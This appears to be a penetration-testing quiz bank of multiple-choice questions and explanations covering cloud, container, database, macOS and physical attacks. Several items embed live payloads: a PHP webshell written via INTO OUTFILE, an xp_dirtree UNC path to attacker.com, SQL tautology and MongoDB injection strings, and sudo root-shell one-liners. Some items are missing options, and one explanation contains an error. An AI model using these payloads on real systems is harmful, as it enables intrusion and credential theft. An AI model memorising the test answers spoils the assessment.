options.C: Restrict users to the specifically permitted list of snap-ins
options.D: Run only specified Windows applications

questions.explanation: 'Run only specified Windows applications' (a whitelist) allows only listed executables to launch, blocking all others via Explorer and the Run dialog. 'Do not run specified Windows applications' is a blacklist approach and less secure.

questions.question: Which AMSI bypass technique evades detection by splitting a malicious string literal across multiple concatenated variables, preventing the full signature from appearing in a single buffer scan?

options.A: Reflective DLL injection into a trusted process
options.B: String concatenation / obfuscation to fragment the malicious signature
options.C: Disabling ETW (Event Tracing for Windows) via NtTraceEvent patch
options.D: Using COM scriptlet (SCT) files hosted on a remote server

questions.explanation: AMSI scans the buffer of script content. By splitting malicious strings across multiple variables that are only concatenated at runtime, the full signature never appears in a single scan buffer, evading AMSI's pattern-matching detection.

questions.question: What is the purpose of the 'Credential Guard' feature in a locked-down Windows environment?

options.A: It prevents users from saving passwords in web browsers
options.B: It uses Virtualization-Based Security to protect NTLM hashes and Kerberos tickets in an isolated process (LSAIso), preventing Pass-the-Hash and Pass-the-Ticket
options.C: It enforces password complexity requirements via Group Policy
options.D: It encrypts the Windows credential store with a user-supplied PIN

questions.explanation: Credential Guard isolates LSA secrets (NTLM hashes, Kerberos TGTs) in a separate VBS-protected process (LSAIso). Even with SYSTEM-level access, attackers cannot dump these credentials from LSASS because they reside in the isolated hypervisor container.

questions.question: An attacker exploits an SSRF vulnerability on an EC2 instance to reach http://169.254.169.254/latest/meta-data/iam/security-credentials/. What are they attempting to retrieve?

options.A: The AMI ID of the running instance
options.B: Temporary AWS credentials (Access Key ID, Secret Access Key, Session Token) for the attached IAM role
options.C: The SSH private key used to launch the instance
options.D: The instance's VPC security group rules

questions.explanation: The EC2 Instance Metadata Service (IMDS) at 169.254.169.254 exposes temporary credentials for the IAM role attached to the instance. IMDSv1 is vulnerable to SSRF as it requires no additional headers; IMDSv2 mitigates this with a session token.

questions.question: What is the key security improvement of IMDSv2 (Instance Metadata Service v2) over IMDSv1?

options.A: IMDSv2 encrypts credentials with the instance's TLS certificate
options.B: IMDSv2 requires a PUT request to obtain a session token before GET requests, mitigating SSRF attacks
options.C: IMDSv2 limits metadata access to the root user only
options.D: IMDSv2 restricts metadata access to the instance's VPC CIDR range

questions.explanation: IMDSv2 requires a two-step process: first a PUT request to create a session token (with a TTL), then GET requests must include that token in the X-aws-ec2-metadata-token header. This prevents SSRF exploitation since SSRFs typically cannot follow the PUT→GET flow.

questions.question: Which AWS CLI command lists all IAM policies attached directly to a user, helping enumerate over-privileged accounts?

options.A: aws iam list-user-policies --user-name <username>
options.B: aws iam get-user --user-name <username>
options.C: aws iam list-attached-user-policies --user-name <username>
options.D: aws iam simulate-principal-policy --policy-source-arn <arn>

questions.explanation: list-attached-user-policies returns managed policies directly attached to a user. list-user-policies returns inline policies. Both should be checked during IAM enumeration to understand a user's effective permissions.

questions.question: An attacker discovers a publicly accessible S3 bucket containing sensitive data. Which AWS S3 configuration caused this exposure?

options.A: The bucket has versioning enabled
options.B: The bucket policy grants s3:GetObject to Principal: "*" or the bucket ACL grants public read
options.C: The bucket is in a region with weaker encryption standards
options.D: The bucket uses SSE-S3 instead of SSE-KMS for server-side encryption

questions.explanation: S3 buckets become publicly accessible when the bucket policy grants GetObject to Principal '*' (all principals) or the ACL grants public-read. AWS now also requires the Account Public Access Block to be disabled for either to take effect.

questions.question: Which tool is specifically designed for AWS cloud penetration testing and can enumerate IAM permissions, find S3 buckets, and perform privilege escalation in AWS environments?

options.A: ScoutSuite
options.B: Prowler
options.C: Pacu
options.D: CloudMapper

questions.explanation: Pacu is an open-source AWS exploitation framework designed for offensive security testing. It provides modules for enumeration, privilege escalation, persistence, and exfiltration across AWS services. ScoutSuite and Prowler are primarily assessment/auditing tools.

questions.question: An attacker with the 'iam:CreatePolicyVersion' permission and 'iam:SetDefaultPolicyVersion' can perform which privilege escalation technique?

options.A: Attach an existing AdministratorAccess policy to their user
options.B: Create a new policy version granting AdministratorAccess and set it as the default
options.C: Assume any IAM role in the account using STS
options.D: Enumerate all users and groups without logging the action in CloudTrail

questions.explanation: With iam:CreatePolicyVersion, an attacker can add a new version of an existing policy (e.g., one attached to their own user) granting full admin access, then use iam:SetDefaultPolicyVersion to activate it, escalating their own privileges.

questions.question: Which AWS service logs API calls made to AWS services and is the primary audit trail for detecting malicious activity in an AWS account?

options.A: AWS Config
options.B: VPC Flow Logs
options.C: AWS CloudTrail
options.D: Amazon GuardDuty

questions.explanation: CloudTrail records API calls made to AWS services, including the caller identity, time, source IP, and request/response parameters. Attackers often attempt to disable CloudTrail or create trails in unused regions to evade detection.

questions.question: An attacker compromises a Lambda function and finds environment variables containing AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY. What is the most likely impact?

options.A: Read-only access to the Lambda function's code
options.B: Access to AWS services using the Lambda execution role's permissions, potentially including S3, DynamoDB, or EC2 depending on the role
options.C: Access only to the specific Lambda function, limited by function-level isolation
options.D: No impact since Lambda credentials are automatically rotated every hour

questions.explanation: Lambda functions run with an IAM execution role whose temporary credentials are injected as environment variables. Compromising these grants an attacker the same AWS permissions as the Lambda function's role for the duration of the credential's TTL.

questions.question: Which Azure service is analogous to AWS IAM for managing identities, and what is the primary attack target when testing Azure environments?

options.A: Azure Key Vault — storing and managing cryptographic keys
options.B: Azure Active Directory (Azure AD / Entra ID) — managing users, service principals, and managed identities
options.C: Azure Security Center — monitoring and threat detection
options.D: Azure Resource Manager — deploying and managing resources

questions.explanation: Azure AD (now Microsoft Entra ID) is the identity platform for Azure. Compromising service principals, managed identities, or app registrations with excessive permissions is a primary attack path in Azure penetration testing.

questions.question: What is a 'managed identity' in Azure, and why is it a common target in cloud penetration tests?

options.A: A pre-configured VM template managed by Microsoft, targeted for image tampering
options.B: An automatically managed Azure AD identity assigned to an Azure resource (VM, App Service, etc.) that can obtain tokens to access other Azure services without storing credentials
options.C: A shared service account managed by an Azure AD administrator for multiple services
options.D: A federated identity from an on-premises Active Directory synced to Azure AD

questions.explanation: Managed identities provide Azure resources with an automatic, credential-less identity. From a compromised resource (e.g., a VM or App Service), an attacker can request access tokens from the metadata endpoint to access other Azure services based on the identity's assigned roles.

questions.question: Which GCP attack involves abusing a service account key file that was committed to a public GitHub repository?

options.A: Workload Identity federation abuse
options.B: Long-lived service account key exfiltration and use to authenticate to GCP APIs
options.C: Cloud Storage bucket ACL manipulation
options.D: GCP metadata server SSRF

questions.explanation: GCP service account key files are JSON files containing a private key that can authenticate to GCP APIs indefinitely (they don't expire unless manually rotated or deleted). Keys committed to public repos are a common misconfiguration that grants full service account access.

questions.question: Which cloud security tool performs multi-cloud assessments, auditing AWS, Azure, and GCP against CIS benchmarks and other security frameworks?

options.A: Pacu
options.B: CloudSploit
options.C: ScoutSuite
options.D: Enumerate-IAM

questions.explanation: ScoutSuite is a multi-cloud security auditing tool that assesses AWS, Azure, GCP, and other cloud providers against security best practices. It generates an HTML report highlighting misconfigurations, unlike Pacu which is an exploitation framework.

questions.question: An attacker finds an EC2 user-data script (via the metadata service) that contains: export DB_PASSWORD=Sup3rS3cret. What is the impact?

options.A: The password is hashed and cannot be recovered
options.B: The plaintext database password is exposed and can be used to directly access the database
options.C: The password is only valid for the EC2 instance boot process
options.D: User-data is encrypted and only accessible by the instance owner

questions.explanation: EC2 user-data is stored in plaintext and accessible via the IMDSv1 metadata service without authentication. Secrets hardcoded in user-data scripts (environment variables, passwords, API keys) are a common cloud misconfiguration.

questions.question: What is a security risk of using overly broad IAM permission wildcards such as 's3:*' or 'ec2:*' in an IAM policy?

options.A: Wildcards cause CloudTrail logging to fail for those API calls
options.B: An attacker who compromises that identity gains all S3 or EC2 permissions, violating least privilege and expanding the blast radius
options.C: Wildcard policies cannot be applied to IAM roles, only users
options.D: AWS bills more for API calls made under wildcard policies

questions.explanation: Overly broad IAM policies violate the principle of least privilege. If an identity with 's3:*' is compromised, the attacker gains full S3 access (read, write, delete, bucket policy modification), far exceeding what the application likely needs.

questions.question: During a CI/CD pipeline assessment, an attacker finds a GitHub Actions workflow that uses a self-hosted runner and can trigger the workflow via a pull request. What is the risk?

options.A: The attacker can read the repository's README file
options.B: The attacker can execute arbitrary code on the self-hosted runner, potentially accessing secrets, cloud credentials, or the internal network
options.C: The attacker can merge code without a code review
options.D: The attacker can access the GitHub Actions SaaS infrastructure

questions.explanation: Self-hosted runners execute workflow code in the organisation's environment. An attacker who can trigger a workflow (e.g., via a pull request to a public repo) can inject malicious steps that run on the runner, accessing secrets, credentials, or the internal network.

questions.question: Which AWS privilege escalation path exploits the ability to create a new IAM user and attach the AdministratorAccess policy?

options.A: iam:CreateUser + iam:AttachUserPolicy
options.B: iam:PassRole + lambda:CreateFunction
options.C: iam:CreateRole + sts:AssumeRole
options.D: iam:UpdateAssumeRolePolicy + sts:AssumeRole

questions.explanation: With iam:CreateUser and iam:AttachUserPolicy permissions, an attacker can create a new IAM user and attach the AdministratorAccess managed policy to it, then create access keys for that user to gain full AWS access.

questions.question: Which container escape technique exploits access to /var/run/docker.sock mounted inside a container?

options.A: Overwriting the host's /etc/passwd via a shared volume
options.B: Using the Docker API through the socket to launch a new privileged container with the host filesystem mounted, then chrooting to it
options.C: Sending a kernel exploit payload through the socket to the host kernel
options.D: Reading the host's /proc/keys through the socket to steal encryption keys

questions.explanation: The Docker socket provides unauthenticated access to the Docker daemon API. An attacker can use it to launch a new container with the host filesystem mounted and privileged access, then chroot or nsenter into the host, effectively escaping the container.

questions.question: A container is started with 'docker run --privileged'. What security boundary does this effectively remove?

options.A: Network isolation between the container and the host
options.B: All Linux capability and seccomp restrictions; the container has nearly equivalent access to the host kernel as a root process on the host
options.C: Filesystem isolation, allowing the container to access all host files
options.D: Process isolation, making the container's processes visible in the host's process list

questions.explanation: The --privileged flag grants all Linux capabilities and disables seccomp, AppArmor, and other security profiles. A privileged container can mount the host filesystem, load kernel modules, manipulate cgroups, and perform other host-level operations.

questions.question: CVE-2019-5736 (runc overwrite) allowed container escape by exploiting which behaviour?

options.A: A heap overflow in the Docker daemon that allows arbitrary command execution on the host
options.B: The ability of a malicious container to overwrite the host runc binary during execution, achieving host code execution on the next container launch
options.C: An SSRF vulnerability in the container registry that allows pushing malicious images
options.D: A race condition in cgroup v1 that allows privilege escalation to root within the container

questions.explanation: CVE-2019-5736 exploited the fact that runc opens itself via /proc/self/exe inside the container. A malicious container could overwrite the runc binary on the host by writing to /proc/self/exe while it was being executed, causing the next container launch to execute attacker-controlled code.

questions.question: Which Kubernetes RBAC misconfiguration is most dangerous and grants an attacker full control over the cluster?

options.A: Binding the 'view' ClusterRole to an unauthenticated user
options.B: Binding the 'cluster-admin' ClusterRole to a service account, user, or group (especially system:authenticated or system:unauthenticated)
options.C: Granting 'get' permissions on Secrets in the default namespace
options.D: Allowing 'list' access to Pods across all namespaces

questions.explanation: The cluster-admin ClusterRole grants full access to all resources. Binding it to system:authenticated or system:unauthenticated means any authenticated (or unauthenticated) user has full cluster control. Binding it to a compromised service account similarly grants full access.

questions.question: Which kubelet port, if exposed without authentication, allows an attacker to execute commands in any pod on the node?
questions.explanation: The kubelet's HTTPS API on port 10250 allows executing commands in pods and reading logs. If exposed without authentication (anonymous-auth: true), attackers can use the /exec endpoint to run arbitrary commands in any pod on the node.

questions.question: An attacker compromises a pod and finds the file /var/run/secrets/kubernetes.io/serviceaccount/token. What can they do with this?

options.A: Decrypt etcd data stored in the cluster
options.B: Authenticate to the Kubernetes API server with the service account's permissions
options.C: Access the container registry to pull other images
options.D: Generate new service account tokens for other namespaces

questions.explanation: Every Kubernetes pod by default has a service account token mounted at this path. This JWT token can be used to authenticate to the Kubernetes API server. If the service account has excessive RBAC permissions, the attacker can escalate within the cluster.

questions.question: Which container escape technique uses the cgroup v1 release_agent to achieve code execution on the host?

options.A: Writing a shell script to /sys/fs/cgroup/memory/release_agent and triggering it by spawning then killing a process in a new cgroup
options.B: Mounting the host's /proc filesystem and modifying kernel parameters
options.C: Using the Docker socket to call the cgroup API
options.D: Exploiting a race condition in cgroup v2 namespace isolation

questions.explanation: The cgroup v1 release_agent escape works by writing a malicious script to the release_agent file in a writable cgroup directory, then triggering it by creating a child cgroup, placing a process in it, and killing that process. The release_agent runs on the host as root when the cgroup becomes empty.

questions.question: etcd is a critical component of Kubernetes. Why is an unencrypted or unauthenticated etcd endpoint particularly dangerous?

options.A: etcd stores Kubernetes Secrets in base64-encoded plaintext; direct access allows reading all secrets including service account tokens and TLS certificates
options.B: etcd controls pod scheduling and a compromise causes denial of service
options.C: etcd stores the container runtime configuration including image signing keys
options.D: etcd is the source of truth for network policies, and compromise allows network pivoting

questions.explanation: Kubernetes Secrets are stored in etcd as base64-encoded values (not encrypted by default unless etcd encryption at rest is configured). Direct access to etcd (port 2379) allows reading all cluster secrets, including service account tokens, TLS certs, and application credentials.

questions.question: Which Docker security mechanism restricts the system calls a container can make to the host kernel?

options.A: AppArmor
options.B: seccomp profiles
options.C: Linux capabilities
options.D: cgroups

questions.explanation: seccomp (Secure Computing Mode) profiles restrict which system calls a container process can invoke on the host kernel, reducing the attack surface for kernel exploits. Docker applies a default seccomp profile that blocks dangerous syscalls like unshare and ptrace.

questions.question: Which kubectl command allows an attacker to execute a shell in a running pod, similar to docker exec?

options.A: kubectl attach -it <pod> -c <container>
options.B: kubectl exec -it <pod> -- /bin/bash
options.C: kubectl run shell --image=alpine --restart=Never -it
options.D: kubectl port-forward <pod> 4444:4444

questions.explanation: kubectl exec -it <pod> -- /bin/bash opens an interactive shell in a running container, equivalent to docker exec. This requires 'pods/exec' RBAC permission and is commonly used in both legitimate operations and post-compromise lateral movement.

questions.question: A container is running as root (UID 0) inside the container and has no user namespace mapping configured. What is the security implication?

options.A: The container root maps to the host's root (UID 0), meaning any container escape results in full host root access
options.B: The container root is isolated from the host and maps to an unprivileged UID
options.C: The container cannot read host files even if it escapes due to MAC policy enforcement
options.D: The container root only has reduced capabilities compared to host root

questions.explanation: Without user namespace remapping, UID 0 inside a container is the same UID 0 on the host. If a container escape vulnerability is exploited, the attacker immediately has root on the host system. User namespaces remap container UIDs to unprivileged host UIDs, limiting this risk.

questions.question: What type of hypervisor runs directly on the physical hardware without an underlying OS, such as VMware ESXi or Microsoft Hyper-V?

options.A: Type 2 hypervisor
options.B: Paravirtualised hypervisor
options.C: Type 1 (bare-metal) hypervisor
options.D: Hosted hypervisor

questions.explanation: Type 1 (bare-metal) hypervisors run directly on the host hardware and manage guest VMs directly, providing better performance and security isolation. Examples include VMware ESXi, Microsoft Hyper-V, and Xen. Type 2 hypervisors run on top of a host OS.

questions.question: VENOM (CVE-2015-3456) was a critical VM escape vulnerability affecting which virtual device?

options.A: The virtual network interface card (vNIC) driver
options.B: The virtual Floppy Disk Controller (FDC) in QEMU/KVM and other hypervisors
options.C: The Virtual Machine Communication Interface (VMCI)
options.D: The virtual USB controller

questions.explanation: VENOM (Virtualized Environment Neglected Operations Manipulation) was a heap overflow in QEMU's virtual Floppy Disk Controller that allowed a guest VM to escape to the host. It affected QEMU, KVM, Xen, and VirtualBox since they all used the vulnerable QEMU FDC code.

questions.question: Which VMware ESXi vulnerability (CVE-2021-21985) allowed unauthenticated remote code execution through which interface?

options.A: The ESXi SSH service on port 22
options.B: The vCenter Server vSphere Client (HTML5) via a vulnerable plugin
options.C: The VMware vSphere Update Manager service
options.D: The ESXi Fault Domain Manager (FDM) agent

questions.explanation: CVE-2021-21985 was a remote code execution vulnerability in the vSphere Client (HTML5) caused by lack of input validation in the Virtual SAN Health Check plugin. It allowed unauthenticated attackers with network access to port 443 on vCenter Server to execute commands.

questions.question: A VM escape via DMA (Direct Memory Access) attack through Thunderbolt/PCIe is mitigated by which hardware security feature?

options.A: Secure Boot (UEFI)
options.B: IOMMU (Input-Output Memory Management Unit) / Intel VT-d or AMD-Vi
options.C: TPM (Trusted Platform Module)
options.D: Intel TXT (Trusted Execution Technology)

questions.explanation: IOMMU (Intel VT-d or AMD-Vi) restricts which physical memory addresses a PCIe device can access, preventing DMA attacks from malicious or compromised devices from reading/writing arbitrary host memory. Without IOMMU, Thunderbolt devices can perform DMA attacks.

questions.question: In a VMware environment, the VMware Tools 'shared clipboard' and 'drag-and-drop' features represent what security risk?

options.A: They allow a compromised guest to exfiltrate data to the hypervisor's management network
options.B: They create data transfer channels between guest VMs and the host that could leak sensitive information or be used to transfer attack tools across the isolation boundary
options.C: They expose the VMware VMCI socket interface to guest kernel exploits
options.D: They allow guests to mount host filesystem paths directly

questions.explanation: Shared clipboard and drag-and-drop features in VMware Tools create intentional data transfer channels across the VM-host boundary. In sensitive environments, these features should be disabled in the VM's .vmx configuration to enforce strict isolation.

questions.question: An attacker gains access to a VMware datastore and finds a .vmdk (virtual machine disk) file. What can they do with it?

options.A: Nothing useful — VMDK files are encrypted by default
options.B: Mount the VMDK file to access the guest filesystem, extract credentials, and read sensitive data offline
options.C: Inject code into the running VM by modifying the VMDK while it is live
options.D: Use the VMDK to clone the VM and run it on the attacker's infrastructure

questions.explanation: VMDK files are virtual hard disk images. An attacker with access to the datastore can mount them using tools like vmware-mount or Linux loopback devices, gaining full filesystem access to extract credentials, configuration files, and sensitive data — especially valuable for offline password cracking.

questions.question: Which VMware ESXi management interface, if exposed to untrusted networks, is the primary target for attackers seeking to compromise the entire virtualisation layer?

options.A: VMware vSphere Web Services API (port 443) / vCenter Server management interface
options.B: ESXi Shell (SSH on port 22) for individual host management
options.C: VMware vSphere Replication (port 31031)
options.D: VMware Fault Tolerance logging port (port 8100)

questions.explanation: The vCenter Server management interface (typically port 443) controls the entire virtual infrastructure — all hosts, VMs, networking, and storage. Compromise of vCenter provides an attacker with control over every VM in the environment, making it the highest-value target.

questions.question: What is 'VM sprawl' and why is it a security risk?

options.A: VMs consuming excessive CPU, causing denial of service to other VMs on the same host
options.B: The uncontrolled proliferation of VMs that may be forgotten, unpatched, and running outdated software, expanding the attack surface
options.C: A network storm caused by too many virtual switches on a single host
options.D: The risk of a VM snapshot consuming all available datastore space

questions.explanation: VM sprawl occurs when VMs are created but not properly tracked, managed, or decommissioned. Forgotten VMs running outdated OS and application versions become vulnerable targets. They are often not covered by patch management or monitoring processes.

questions.question: In Xen hypervisor architecture, which privileged VM has direct access to physical hardware and manages device drivers on behalf of other VMs?

options.A: Dom1
options.B: HVM domain
options.C: Dom0
options.D: The Xen Security Module (XSM)

questions.explanation: Dom0 (Domain 0) is the privileged management domain in Xen that runs a full OS and has direct access to physical hardware. It manages the hypervisor, runs device drivers, and provides I/O services to unprivileged guest domains (DomU). Compromising Dom0 gives control of the entire hypervisor.

questions.question: Which virtual networking attack involves configuring a VM's virtual NIC in promiscuous mode on a misconfigured virtual switch (vSwitch) to capture traffic from other VMs?

options.A: ARP spoofing across virtual switches
options.B: Promiscuous mode sniffing on virtual port groups that allow it
options.C: VLAN hopping via 802.1Q double-tagging on vSwitches
options.D: MAC flooding of the virtual switch's forwarding table

questions.explanation: VMware vSwitches have a 'Promiscuous Mode' setting on port groups. If allowed (set to Accept), VMs on that port group can see all traffic on the vSwitch segment, not just their own. This is disabled by default but misconfiguration exposes inter-VM traffic.

questions.question: A web application returns different error messages based on whether a SQL condition is true or false, but does not display data. Which SQL injection technique is most appropriate?

options.A: UNION-based injection
options.B: Error-based injection
options.C: Boolean-based blind injection
options.D: Out-of-band injection

questions.explanation: Boolean-based blind SQL injection infers data by asking true/false questions (e.g., 'Is the first character of the admin password greater than M?') and observing different application responses. It requires no direct data output but needs at least two distinguishable response states.

questions.question: Which MSSQL stored procedure, when enabled, allows an attacker with DBA privileges to execute operating system commands?

options.A: sp_OACreate
options.B: xp_cmdshell
options.C: sp_executesql
options.D: xp_dirtree

questions.explanation: xp_cmdshell is an extended stored procedure in MSSQL that executes shell commands on the host OS as the SQL Server service account. It is disabled by default but can be enabled with RECONFIGURE if the attacker has sysadmin privileges.

questions.question: An attacker uses the MSSQL function xp_dirtree with an attacker-controlled UNC path (e.g., xp_dirtree '\\attacker.com\share'). What credential is captured?

options.A: The Windows domain user currently running the SQL query
options.B: The MSSQL sa (system administrator) account hash
options.C: The NTLMv2 hash of the SQL Server service account, captured by Responder on the attacker's machine
options.D: The Kerberos TGT of the database server's machine account

questions.explanation: xp_dirtree causes the SQL Server process to attempt to connect to the UNC path, triggering an NTLMv2 authentication attempt. An attacker running Responder on the target host captures the SQL Server service account's NTLMv2 hash for offline cracking.

questions.question: Which MySQL feature allows writing query results directly to a file on the server filesystem, potentially enabling code execution?

options.A: LOAD DATA INFILE
options.B: SELECT ... INTO OUTFILE
options.C: EXECUTE PROCEDURE
options.D: CREATE EVENT

questions.explanation: SELECT ... INTO OUTFILE writes query output to a file on the server. If the MySQL service has write access to the web root, an attacker can write a PHP webshell (e.g., SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php').

questions.question: Which PostgreSQL feature can be abused to execute OS commands if the database user has SUPERUSER privileges?

options.A: pg_read_file()
options.B: COPY TO/FROM PROGRAM
options.C: CREATE LANGUAGE plpgsql
options.D: dblink extension

questions.explanation: PostgreSQL's COPY command with the PROGRAM option (e.g., COPY t FROM PROGRAM 'id') executes a shell command on the server and reads its output. This requires SUPERUSER privilege and is a powerful OS command execution primitive.

questions.question: A tester submits the payload ' OR '1'='1 into a login form and gains access. What type of SQL injection is this?

options.A: Second-order injection
options.B: UNION-based injection
options.C: Authentication bypass via tautology
options.D: Time-based blind injection

questions.explanation: The payload creates a tautology — '1'='1' is always true — causing the WHERE clause to return all rows, bypassing the password check. This is a classic in-band SQL injection for authentication bypass.

questions.question: Which sqlmap flag instructs it to attempt OS command execution if a stacked queries injection is found in a MSSQL database?

options.A: --dump-all
options.B: --os-shell
options.C: --technique=T
options.D: --sql-query

questions.explanation: sqlmap's --os-shell flag attempts to obtain an interactive OS shell by chaining SQL injection with database-specific OS execution methods (e.g., xp_cmdshell for MSSQL, COPY FROM PROGRAM for PostgreSQL, UDFs for MySQL).

questions.question: Which NoSQL injection payload targets MongoDB's $where operator to bypass authentication?

options.B: {"$where": "this.password.match(/.*/)"}
options.C: 1; DROP TABLE users;--
options.D: ' UNION SELECT username,password FROM users--

questions.explanation: MongoDB's $where operator executes JavaScript server-side. The payload .match(/.*/) matches any string, returning all documents. Modern MongoDB versions disable $where by default; the more common NoSQL injection uses operator injection like {"password": {"$gt": ""}}.

questions.question: An attacker finds a web application that uses parameterised queries for all inputs. Which SQL injection technique might still work?

options.A: First-order (classic) SQL injection
options.B: Second-order (stored) SQL injection if user-controlled data is stored and later used unsafely in a dynamic SQL statement
options.C: Boolean-based blind injection via HTTP headers
options.D: UNION-based injection via the User-Agent header

questions.explanation: Second-order SQL injection occurs when user input is safely stored (e.g., in a username field), but later retrieved and concatenated into a dynamic SQL query without proper sanitisation. The parameterisation of the initial INSERT doesn't protect the subsequent SELECT.

questions.question: Which Oracle database attack vector uses HTTP requests from the database server to internal network services, enabling SSRF?

options.A: UTL_FILE
options.B: UTL_HTTP
options.C: DBMS_SCHEDULER
options.D: DBMS_PIPE

questions.explanation: Oracle's UTL_HTTP package allows the database to make outbound HTTP requests. An attacker with execute permissions can use it to probe internal services, exfiltrate data via DNS/HTTP, or perform SSRF attacks against cloud metadata endpoints.

questions.question: What is the purpose of parameterised queries (prepared statements) in preventing SQL injection?

options.A: They encrypt the SQL query before sending it to the database
options.B: They separate SQL code from data by pre-compiling the query structure, so user input is always treated as a literal value and cannot alter the query logic
options.C: They validate user input against a whitelist of allowed characters
options.D: They run queries in a sandboxed context that prevents access to sensitive tables

questions.explanation: Parameterised queries pre-compile the SQL structure and pass user input as typed parameters, ensuring the database treats the input as data rather than SQL code. Even a SQL injection payload like ' OR '1'='1 is treated as a literal string.

questions.question: What does SIP (System Integrity Protection) prevent on macOS, even for root users?

options.A: Running unsigned applications downloaded from the internet
options.B: Modifying protected system directories (/System, /usr, /bin, /sbin), loading unsigned kernel extensions, and attaching debuggers to system processes
options.C: Accessing user keychain data without explicit permission
options.D: Executing scripts without notarisation approval

questions.explanation: SIP (rootless mode) restricts modifications to protected OS paths and operations even for the root user. It can only be disabled by booting into Recovery Mode, making it a significant barrier against persistent malware even after root compromise.

questions.question: Which macOS persistence mechanism runs as the logged-in user and is stored in ~/Library/LaunchAgents as a .plist file?

options.A: LaunchDaemon
options.B: LaunchAgent
options.C: Login Item
options.D: cron job

questions.explanation: LaunchAgents in ~/Library/LaunchAgents run as the current user when they log in. LaunchDaemons in /Library/LaunchDaemons run as root at system boot. Both are persistent across reboots, making them popular malware persistence mechanisms.

questions.question: An attacker exploits DYLD_INSERT_LIBRARIES on macOS. What does this achieve?

options.A: Replaces the default shell to maintain persistence
options.B: Forces a target executable to load a malicious dylib at startup, enabling code injection
options.C: Bypasses Gatekeeper by modifying the quarantine extended attribute
options.D: Extracts keychain data by hooking macOS security APIs

questions.explanation: DYLD_INSERT_LIBRARIES is a macOS dynamic linker environment variable that forces the loading of specified dylibs into any process. This enables dylib injection for privilege escalation or code execution, though it is blocked for processes with the setuid/setgid bit and hardened runtime.

questions.question: Which macOS security framework controls applications' access to sensitive resources such as the camera, microphone, contacts, and calendar, requiring explicit user consent?

options.A: Gatekeeper
options.B: SIP
options.C: TCC (Transparency, Consent, and Control)
options.D: XProtect

questions.explanation: TCC manages permissions for sensitive resources by maintaining a database of user consent decisions. Attackers may attempt to abuse TCC by injecting code into processes that already have TCC permissions, or by directly modifying the TCC database (if SIP is disabled).

questions.question: Which macOS tool is equivalent to running Mimikatz on Windows, allowing extraction of passwords from the macOS Keychain?

options.A: osquery
options.B: chainbreaker
options.C: SwiftBelt
options.D: system_profiler

questions.explanation: Chainbreaker is a macOS keychain forensics tool that can extract passwords, keys, and certificates from the macOS Keychain database files. The security command-line tool can also access keychain items if the keychain is unlocked.

questions.question: Gatekeeper on macOS enforces which primary security control on downloaded applications?

options.A: All applications must be compiled with Address Space Layout Randomization
options.B: Applications must be signed with a valid Apple Developer certificate and notarised by Apple before they can run
options.C: Applications cannot access the network without explicit firewall approval
options.D: Applications must be installed via the Mac App Store

questions.explanation: Gatekeeper requires that applications are signed with a valid Apple Developer ID and have been notarised (scanned by Apple's automated security checks). It blocks unsigned or unnotarised applications unless the user explicitly overrides the warning.

questions.question: Which macOS privilege escalation technique exploits a misconfigured sudo rule where a user can run a specific binary as root?

options.A: DYLD_INSERT_LIBRARIES injection into a setuid binary
options.B: GTFOBins-style abuse of the allowed sudo binary (e.g., using vim, find, or python to execute a shell as root)
options.C: Modifying the LaunchDaemon plist for the target service
options.D: Exploiting a race condition in the sudo authentication prompt

questions.explanation: If a sudo rule allows a user to run a binary like vim, python, or find as root, GTFOBins-style techniques can spawn a root shell from within that binary (e.g., :!bash in vim, or import os; os.system('/bin/bash') in python).

questions.question: Which macOS directory can be abused for dylib hijacking if an application searches for dylibs in a user-writable location before the system library path?

options.A: /usr/lib/
options.B: /Library/Application Support/
options.C: A user-writable Rpath directory listed before system paths in the binary's @rpath
options.D: /System/Library/Frameworks/

questions.explanation: macOS dylib hijacking exploits @rpath, @loader_path, or @executable_path resolution order. If an application has a writable directory in its @rpath search order before system directories, placing a malicious dylib there causes the application to load it instead of the legitimate library.

questions.question: Which physical security attack involves following an authorised person through a controlled access point without presenting credentials?

options.A: Piggybacking
options.B: Tailgating
options.C: Impersonation
options.D: Bypass

questions.explanation: Tailgating is following someone through a secure door without their knowledge or consent. Piggybacking is similar but the authorised person is aware and complicit (e.g., holding the door open). Both bypass physical access controls.

questions.question: A physical penetration tester uses a Proxmark3 device near an employee. What are they attempting?

options.A: Jamming the building's wireless communications
options.B: Cloning the employee's RFID access card by reading it without contact
options.C: Capturing the employee's mobile phone's Bluetooth pairing keys
options.D: Replaying recorded entry codes from a keypad

questions.explanation: The Proxmark3 is an RFID/NFC research tool capable of reading, cloning, and emulating various RFID card formats (HID, EM4100, Mifare Classic, etc.) at close range. Attackers can covertly read a card in a pocket or bag and clone it onto a blank card.

questions.question: Which lock-picking technique uses a modified pick with a serrated edge that is rapidly raked back and forth to set multiple pins simultaneously?

options.A: Single Pin Picking (SPP)
options.B: Bumping
options.C: Raking
options.D: Shimming

questions.explanation: Raking uses a serrated pick (rake) rapidly moved in and out while applying rotational tension, setting multiple pins by chance rather than precisely. It is faster but less reliable than Single Pin Picking (SPP), which sets each pin individually.

questions.question: A man-trap (airlock) is designed to prevent tailgating. Which attack bypasses it most effectively?

options.A: Lock picking the first door before the second closes
options.B: Social engineering the security guard controlling manual override, or exploiting anti-passback configuration errors
options.C: Jamming the magnetic lock sensor
options.D: Replaying a valid RFID credential captured externally

questions.explanation: Man-traps prevent tailgating by ensuring only one person passes at a time, often with a guard or automated controls. Social engineering the guard (e.g., posing as maintenance staff needing urgent access) or exploiting anti-passback misconfiguration (using the same credential twice) are realistic bypasses.

questions.question: During a physical assessment, a tester delivers USB drives labeled 'PAYROLL Q4' to a company car park. What attack is this?

options.A: Vishing
options.B: Baiting
options.C: Pretexting
options.D: Spear-phishing

questions.explanation: Baiting involves leaving malicious physical media (USB drives, CDs) in locations where targets will find and use them out of curiosity. Labelling them with enticing titles increases the likelihood of an employee plugging them in on a corporate network.

questions.question: Which technique does a physical pen tester use to open a door latch through the gap between a door and its frame using a thin flexible tool?

options.A: Bumping
options.B: Shimming
options.C: Loiding (carding)
options.D: Bypass with a shim

questions.explanation: Loiding (or carding) uses a thin flexible tool (credit card, shim) inserted into the gap between a door and its frame to push back a spring latch bolt. It only works on spring latches (not deadbolts) and is a quick non-destructive entry method.

questions.question: Which proximity card technology used widely in enterprise access control systems communicates at 125 kHz and is considered insecure due to no encryption or mutual authentication?

options.A: Mifare Classic (ISO 14443)
options.B: HID iCLASS SE
options.C: EM4100 / HID Prox (125 kHz)
options.D: FIDO2 / WebAuthn

